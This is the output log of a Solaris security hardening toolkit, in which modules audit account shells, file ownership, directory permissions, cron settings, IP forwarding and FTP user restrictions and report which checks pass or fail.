&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/decode.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/decode.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Decode&#x00A0;disabled&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/disable-L1-A.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/disable-L1-A.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;./modules/disable-L1-A.sh:&#x00A0;./sanity&#x005F;check:&#x00A0;No&#x00A0;such&#x00A0;file&#x00A0;or&#x00A0;directory
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/disable-NFS.bind.sh&#x00A0;now.....

&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/disable-NFS.bind.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Verifying&#x00A0;port&#x00A0;settings&#x00A0;using&#x00A0;ndd
&#x00A0;privileged&#x00A0;port&#x00A0;definition&#x00A0;is&#x00A0;currently&#x00A0;set&#x00A0;to&#x00A0;1024
&#x00A0;
&#x00A0;You&#x00A0;should&#x00A0;run&#x00A0;disable-NFS.bind.sh&#x00A0;with&#x00A0;the&#x00A0;-F&#x00A0;option&#x00A0;(port=1024)
&#x00A0;
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/disable-accounts.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/disable-accounts.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Checking&#x00A0;11&#x00A0;Users....
&#x00A0;Checking&#x00A0;that&#x00A0;shell&#x00A0;set&#x00A0;to&#x00A0;noshell&#x00A0;for:
&#x00A0;daemon&#x00A0;bin&#x00A0;adm&#x00A0;lp&#x00A0;uucp&#x00A0;nuucp&#x00A0;listen&#x00A0;nobody&#x00A0;noaccess&#x00A0;nobody4&#x00A0;ppp
&#x00A0;Verify&#x00A0;shell&#x00A0;status....
&#x00A0;
&#x00A0;daemon&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;bin&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;adm&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;lp&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;uucp&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;nuucp&#x00A0;shell&#x00A0;=&#x00A0;/usr/lib/uucp/uucico&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;listen&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;nobody&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;noaccess&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;nobody4&#x00A0;shell&#x00A0;=&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;ppp&#x00A0;shell&#x00A0;=&#x00A0;/usr/sbin/pppls&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;11&#x00A0;Users&#x00A0;Not&#x00A0;Secured&#x00A0;Out&#x00A0;Of&#x00A0;11
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/disable-core.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/disable-core.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Core&#x00A0;dump&#x00A0;size&#x00A0;has&#x00A0;not&#x00A0;been&#x00A0;set:&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/disable-ping-echo.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/disable-ping-echo.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Ping&#x00A0;echo&#x00A0;response&#x00A0;allowed&#x00A0;-&#x00A0;FAILED&#x00A0;CHECK
&#x00A0;Run&#x00A0;./modules/disable-ping-echo.sh&#x00A0;with&#x00A0;-[Ff]&#x00A0;to&#x00A0;fix...
&#x00A0;
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/disable&#x005F;ip&#x005F;holes.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/disable&#x005F;ip&#x005F;holes.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Checking&#x00A0;ip&#x005F;forwarding...
&#x00A0;ip&#x005F;forwarding&#x00A0;disabled&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;Checking&#x00A0;ip&#x005F;forward&#x005F;src&#x005F;routed...
&#x00A0;ip&#x005F;forward&#x005F;src&#x005F;routed&#x00A0;disabled&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;Checking&#x00A0;ip&#x005F;forward&#x005F;directed&#x005F;broadcasts...
&#x00A0;ip&#x005F;forward&#x005F;directed&#x005F;broadcasts&#x00A0;disabled&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;Checking&#x00A0;ip&#x005F;ignore&#x005F;redirect...
&#x00A0;ip&#x005F;ignore&#x005F;redirect&#x00A0;enabled&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK

&#x00A0;Checking&#x00A0;ip&#x005F;strict&#x005F;dst&#x005F;multihoming...
&#x00A0;ip&#x005F;strict&#x005F;dst&#x005F;multihoming&#x00A0;enabled&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;System&#x00A0;configured&#x00A0;as&#x00A0;&#x2019;notrouter&#x2019;&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/dmi-2.6.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/dmi-2.6.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;ERROR&#x00A0;-&#x00A0;This&#x00A0;script&#x00A0;is&#x00A0;Only&#x00A0;supported&#x00A0;on&#x00A0;Solaris&#x00A0;2.6&#x00A0;and&#x00A0;newer,
&#x00A0;please&#x00A0;use&#x00A0;one&#x00A0;of&#x00A0;the&#x00A0;other&#x00A0;scripts&#x00A0;for&#x00A0;your&#x00A0;OS
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/eeprom.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/eeprom.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Architecture&#x00A0;=&#x00A0;i86pc
&#x00A0;Eeprom&#x00A0;security-mode&#x00A0;not&#x00A0;supported&#x00A0;on&#x00A0;this&#x00A0;host
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/file-own.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/file-own.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Checking&#x00A0;/usr&#x00A0;file&#x00A0;ownership
&#x00A0;Found&#x00A0;25345&#x00A0;files&#x00A0;in&#x00A0;/usr&#x00A0;that&#x00A0;should&#x00A0;be&#x00A0;root&#x00A0;owned
&#x00A0;Checking&#x00A0;/sbin&#x00A0;file&#x00A0;ownership
&#x00A0;Found&#x00A0;13&#x00A0;files&#x00A0;in&#x00A0;/sbin&#x00A0;that&#x00A0;should&#x00A0;be&#x00A0;root&#x00A0;owned
&#x00A0;Checking&#x00A0;/usr&#x00A0;group&#x00A0;permissions
&#x00A0;Found&#x00A0;0&#x00A0;files&#x00A0;in&#x00A0;/usr&#x00A0;that&#x00A0;should&#x00A0;be&#x00A0;set&#x00A0;group&#x00A0;g-w
&#x00A0;Checking&#x00A0;/sbin&#x00A0;group&#x00A0;permissions
&#x00A0;Found&#x00A0;0&#x00A0;files&#x00A0;in&#x00A0;/sbin&#x00A0;that&#x00A0;should&#x00A0;be&#x00A0;set&#x00A0;group&#x00A0;g-w
&#x00A0;Checking&#x00A0;/etc&#x00A0;group&#x00A0;permissions
&#x00A0;Found&#x00A0;0&#x00A0;files&#x00A0;in&#x00A0;/etc&#x00A0;that&#x00A0;should&#x00A0;be&#x00A0;set&#x00A0;group&#x00A0;g-w
&#x00A0;Checking&#x00A0;/opt&#x00A0;group&#x00A0;permissions
&#x00A0;Found&#x00A0;0&#x00A0;files&#x00A0;in&#x00A0;/opt&#x00A0;that&#x00A0;should&#x00A0;be&#x00A0;set&#x00A0;group&#x00A0;g-w
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/fix-cronpath.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/fix-cronpath.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;File&#x00A0;/var/spool/cron/crontabs/root&#x00A0;exists;&#x00A0;continuing
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc&#x00A0;is&#x00A0;not&#x00A0;writable&#x00A0;by&#x00A0;world&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc&#x00A0;is&#x00A0;not&#x00A0;writeable&#x00A0;by&#x00A0;group&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/cron.d&#x00A0;is&#x00A0;not&#x00A0;writable&#x00A0;by&#x00A0;world&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/cron.d&#x00A0;is&#x00A0;not&#x00A0;writeable&#x00A0;by&#x00A0;group&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr&#x00A0;is&#x00A0;not&#x00A0;writable&#x00A0;by&#x00A0;world&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;drwxrwxr-x&#x00A0;&#x00A0;32&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1024&#x00A0;Oct&#x00A0;&#x00A0;8&#x00A0;00:58&#x00A0;/usr
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr&#x00A0;is&#x00A0;writeable&#x00A0;by&#x00A0;group&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin&#x00A0;is&#x00A0;not&#x00A0;writable&#x00A0;by&#x00A0;world&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;drwxrwxr-x&#x00A0;&#x00A0;&#x00A0;5&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4608&#x00A0;Sep&#x00A0;24&#x00A0;01:32&#x00A0;/usr/sbin
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin&#x00A0;is&#x00A0;writeable&#x00A0;by&#x00A0;group&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib&#x00A0;is&#x00A0;not&#x00A0;writable&#x00A0;by&#x00A0;world&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;drwxrwxr-x&#x00A0;&#x00A0;42&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;10240&#x00A0;Oct&#x00A0;&#x00A0;8&#x00A0;00:55&#x00A0;/usr/lib
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib&#x00A0;is&#x00A0;writeable&#x00A0;by&#x00A0;group&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib/fs&#x00A0;is&#x00A0;not&#x00A0;writable&#x00A0;by&#x00A0;world&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;drwxrwxr-x&#x00A0;&#x00A0;13&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;512&#x00A0;Sep&#x00A0;23&#x00A0;18:33&#x00A0;/usr/lib/fs
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib/fs&#x00A0;is&#x00A0;writeable&#x00A0;by&#x00A0;group&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib/fs/nfs&#x00A0;is&#x00A0;not&#x00A0;writable&#x00A0;by&#x00A0;world&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.

&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib/fs/nfs&#x00A0;is&#x00A0;not&#x00A0;writeable&#x00A0;by&#x00A0;group&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/bin&#x00A0;is&#x00A0;not&#x00A0;writable&#x00A0;by&#x00A0;world&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK.
&#x00A0;drwxrwxr-x&#x00A0;&#x00A0;&#x00A0;3&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;7680&#x00A0;Oct&#x00A0;&#x00A0;8&#x00A0;00:52&#x00A0;/usr/bin
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/bin&#x00A0;is&#x00A0;writeable&#x00A0;by&#x00A0;group&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/cron.d/logchecker&#x00A0;ownership&#x00A0;should&#x00A0;be&#x00A0;changed&#x00A0;to&#x00A0;root
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib/newsyslog&#x00A0;ownership&#x00A0;should&#x00A0;be&#x00A0;changed&#x00A0;to&#x00A0;root
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/bin/rdate&#x00A0;ownership&#x00A0;should&#x00A0;be&#x00A0;changed&#x00A0;to&#x00A0;root
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/rtc&#x00A0;ownership&#x00A0;should&#x00A0;be&#x00A0;changed&#x00A0;to&#x00A0;root
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;No&#x00A0;cron.allow&#x00A0;file&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/fix-modes.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/fix-modes.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Only&#x00A0;supported&#x00A0;on&#x00A0;Solaris&#x00A0;2.2&#x00A0;thru&#x00A0;2.6
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/fix-stack.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/fix-stack.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;ERROR&#x00A0;-&#x00A0;This&#x00A0;script&#x00A0;is&#x00A0;Only&#x00A0;known&#x00A0;to&#x00A0;work&#x00A0;on&#x00A0;Solaris&#x00A0;2.5.[0-5]
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/fix-stack.sol2.6.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/fix-stack.sol2.6.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Stack&#x00A0;Protection&#x00A0;not&#x00A0;currently&#x00A0;set&#x00A0;-&#x00A0;Run&#x00A0;fix-stack.sol2.6.sh&#x00A0;-F
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/ftpusers.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/ftpusers.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;No&#x00A0;/etc/ftpusers&#x00A0;file&#x00A0;in&#x00A0;place...
&#x00A0;Should&#x00A0;contain&#x00A0;at&#x00A0;least:
&#x00A0;
&#x00A0;root
&#x00A0;daemon
&#x00A0;sys
&#x00A0;bin
&#x00A0;adm
&#x00A0;lp
&#x00A0;smtp
&#x00A0;uucp
&#x00A0;nuucp
&#x00A0;listen
&#x00A0;nobody
&#x00A0;noaccess
&#x00A0;news
&#x00A0;ingres
&#x00A0;audit
&#x00A0;admin
&#x00A0;sync
&#x00A0;nobody4
&#x00A0;
&#x00A0;Please&#x00A0;Run&#x00A0;with&#x00A0;&#x2019;-F/f&#x2019;&#x00A0;to&#x00A0;Fix&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK

&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/hosts.equiv.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/hosts.equiv.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;No&#x00A0;/etc/hosts.equiv&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;
